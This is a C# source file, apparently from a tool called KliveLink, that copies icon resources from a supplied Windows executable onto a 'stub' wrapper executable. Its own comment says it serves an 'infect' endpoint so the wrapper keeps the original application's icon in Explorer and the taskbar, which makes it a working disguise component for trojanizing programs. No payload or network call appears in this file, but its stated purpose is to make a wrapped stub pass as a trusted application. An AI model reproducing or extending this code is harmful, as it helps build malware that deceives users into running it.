using System.Runtime.InteropServices;

namespace Omnipotent.Services.KliveLink;

/// <summary>
/// Copies an application's icon resources from one PE file onto another. Used by the
/// infect endpoint so the wrapper keeps the supplied application's icon in Explorer,
/// the taskbar and any shell that reads RT_GROUP_ICON.
/// </summary>
internal static class PeIconUpdater
{
    private static readonly IntPtr RtIcon = (IntPtr)3;
    private static readonly IntPtr RtGroupIcon = (IntPtr)14;
    private const uint LoadLibraryAsDataFile = 0x00000002;
    private const uint LoadLibraryAsImageResource = 0x00000020;

    private delegate bool EnumResNameProc(IntPtr module, IntPtr type, IntPtr name, IntPtr param);
    private delegate bool EnumResLangProc(IntPtr module, IntPtr type, IntPtr name, ushort language, IntPtr param);

    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr LoadLibraryExW(string fileName, IntPtr file, uint flags);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool FreeLibrary(IntPtr module);

    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool EnumResourceNamesW(IntPtr module, IntPtr type, EnumResNameProc callback, IntPtr param);

    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool EnumResourceLanguagesW(IntPtr module, IntPtr type, IntPtr name, EnumResLangProc callback, IntPtr param);

    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr FindResourceW(IntPtr module, IntPtr name, IntPtr type);

    [DllImport("kernel32", SetLastError = true)]
    private static extern IntPtr LoadResource(IntPtr module, IntPtr info);

    [DllImport("kernel32", SetLastError = true)]
    private static extern IntPtr LockResource(IntPtr data);

    [DllImport("kernel32", SetLastError = true)]
    private static extern uint SizeofResource(IntPtr module, IntPtr info);

    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern IntPtr BeginUpdateResourceW(string fileName, bool deleteExistingResources);

    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool UpdateResourceW(IntPtr update, IntPtr type, IntPtr name, ushort language, byte[] data, uint size);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool EndUpdateResourceW(IntPtr update, bool discard);

    /// <summary>
    /// Returns a copy of <paramref name="stub"/> carrying <paramref name="original"/>'s
    /// icon resources, or the untouched stub when the original has no usable icon.
    /// </summary>
    public static byte[] ApplyOriginalIcon(byte[] original, byte[] stub)
    {
        if (original.Length < 2 || stub.Length < 2) return stub;
        string directory = Path.Combine(Path.GetTempPath(), "kl_icon_" + Guid.NewGuid().ToString("N"));
        try
        {
            Directory.CreateDirectory(directory);
            string sourcePath = Path.Combine(directory, "original.exe");
            string targetPath = Path.Combine(directory, "stub.exe");
            File.WriteAllBytes(sourcePath, original);
            File.WriteAllBytes(targetPath, stub);
            return TryCopyIcon(sourcePath, targetPath) ? File.ReadAllBytes(targetPath) : stub;
        }
        catch
        {
            return stub;
        }
        finally
        {
            try { Directory.Delete(directory, true); } catch { }
        }
    }

    private static bool TryCopyIcon(string sourcePath, string targetPath)
    {
        IntPtr source = IntPtr.Zero;
        IntPtr update = IntPtr.Zero;
        try
        {
            source = LoadLibraryExW(sourcePath, IntPtr.Zero, LoadLibraryAsDataFile | LoadLibraryAsImageResource);
            if (source == IntPtr.Zero) return false;

            var groupNames = new List<IntPtr>();
            EnumResourceNamesW(source, RtGroupIcon, (module, type, name, param) =>
            {
                groupNames.Add(name);
                return true;
            }, IntPtr.Zero);
            if (groupNames.Count == 0) return false;

            IntPtr groupInfo = FindResourceW(source, groupNames[0], RtGroupIcon);
            if (groupInfo == IntPtr.Zero) return false;
            byte[] groupData = ReadResource(source, groupInfo);
            if (groupData.Length < 6) return false;

            int count = BitConverter.ToUInt16(groupData, 4);
            if (count <= 0 || groupData.Length < 6 + count * 14) return false;

            var icons = new List<byte[]>(count);
            for (int i = 0; i < count; i++)
            {
                int entry = 6 + i * 14;
                ushort iconId = BitConverter.ToUInt16(groupData, entry + 12);
                IntPtr iconInfo = FindResourceW(source, (IntPtr)iconId, RtIcon);
                if (iconInfo == IntPtr.Zero) return false;
                byte[] iconData = ReadResource(source, iconInfo);
                if (iconData.Length == 0) return false;
                icons.Add(iconData);
            }

            // Rewrite the group entries to ids we control, so the wrapper's existing
            // icon ids cannot point the new group at the wrong image.
            for (int i = 0; i < count; i++)
            {
                ushort newId = (ushort)(1000 + i);
                BitConverter.GetBytes(newId).CopyTo(groupData, 6 + i * 14 + 12);
            }

            HashSet<ushort> languages = TargetIconLanguages(targetPath);
            if (languages.Count == 0) languages.Add(0);

            update = BeginUpdateResourceW(targetPath, false);
            if (update == IntPtr.Zero) return false;

            foreach (ushort language in languages)
            {
                for (int i = 0; i < icons.Count; i++)
                {
                    if (!UpdateResourceW(update, RtIcon, (IntPtr)(1000 + i), language,
                            icons[i], (uint)icons[i].Length))
                        return false;
                }
                if (!UpdateResourceW(update, RtGroupIcon, (IntPtr)1, language,
                        groupData, (uint)groupData.Length))
                    return false;
            }

            if (!EndUpdateResourceW(update, false)) return false;
            update = IntPtr.Zero;
            return true;
        }
        catch
        {
            return false;
        }
        finally
        {
            if (update != IntPtr.Zero)
            {
                try { EndUpdateResourceW(update, true); } catch { }
            }
            if (source != IntPtr.Zero)
            {
                try { FreeLibrary(source); } catch { }
            }
        }
    }

    private static HashSet<ushort> TargetIconLanguages(string path)
    {
        var languages = new HashSet<ushort>();
        IntPtr module = LoadLibraryExW(path, IntPtr.Zero, LoadLibraryAsDataFile | LoadLibraryAsImageResource);
        if (module == IntPtr.Zero) return languages;
        try
        {
            EnumResourceLanguagesW(module, RtGroupIcon, (IntPtr)1,
                (m, type, name, language, param) =>
                {
                    languages.Add(language);
                    return true;
                }, IntPtr.Zero);
        }
        finally
        {
            FreeLibrary(module);
        }
        return languages;
    }

    private static byte[] ReadResource(IntPtr module, IntPtr info)
    {
        uint size = SizeofResource(module, info);
        if (size == 0) return Array.Empty<byte>();
        IntPtr loaded = LoadResource(module, info);
        IntPtr data = loaded == IntPtr.Zero ? IntPtr.Zero : LockResource(loaded);
        if (data == IntPtr.Zero) return Array.Empty<byte>();
        byte[] bytes = new byte[(int)size];
        Marshal.Copy(data, bytes, 0, bytes.Length);
        return bytes;
    }
}
